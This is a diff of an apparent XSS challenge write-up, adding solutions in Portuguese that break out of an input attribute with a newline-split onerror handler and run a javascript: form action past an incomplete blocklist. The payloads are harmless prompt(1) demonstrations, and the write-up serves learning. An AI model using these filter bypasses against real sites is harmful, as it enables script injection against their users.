@@ -62,7 +62,6 @@ HTML source:
 ![image](https://github.com/user-attachments/assets/c45de787-add9-4100-afa2-05661fd71948)
 
 Input:
-
 ```
 --!> <img src=x onerror=prompt(1)
 ```
@@ -82,9 +81,44 @@ HTML source:
 
 ![image](https://github.com/user-attachments/assets/41260ad4-96ca-4920-82e4-d14b137026db)
 
+Input:
+```
+"type=image src onerror
+="prompt(1)
+```
+
+Description:
+O payload funciona porque o " fecha o atributo value, permitindo injetar novos atributos no <input>. O type=image faz o navegador tentar carregar uma imagem, e o src (mesmo sem valor) ativa esse carregamento. Como a imagem não existe, ocorre um erro que dispara o onerror. A quebra de linha entre onerror e = serve para burlar o filtro regex, que só detecta on...= na mesma linha.
+
+HTML source:
+```
+<input value=""type=image src onerror
+="prompt(1)" type="text">
+```
+
 -----
 
 ![image](https://github.com/user-attachments/assets/cb66fc90-8b07-4e5e-9ea1-fc58f5b9e319)
+
+Input:
+```
+javascript:prompt(1)#{"action":1}
+```
+
+Description:
+O payload funciona porque javascript:prompt(1) define o action do formulário como código JavaScript executável. O #{"action":1} garante que o JSON seja válido e o código não quebre. O filtro tenta bloquear apenas script: e data:, mas esquece de incluir javascript:, permitindo o bypass. Quando form.submit() é chamado, o navegador executa o código no action.
+
+HTML source:
+```
+<form action="javascript:prompt(1)" method="post"><input name="actio" value="1"></form>                         
+<script>                                                  
+    // forbid javascript: or vbscript: and data: stuff    
+    if (!/script:|data:/i.test(document.forms[0].action)) 
+        document.forms[0].submit();                       
+    else                                                  
+        document.write("Action forbidden.")               
+</script>
+```
 
 -----
 
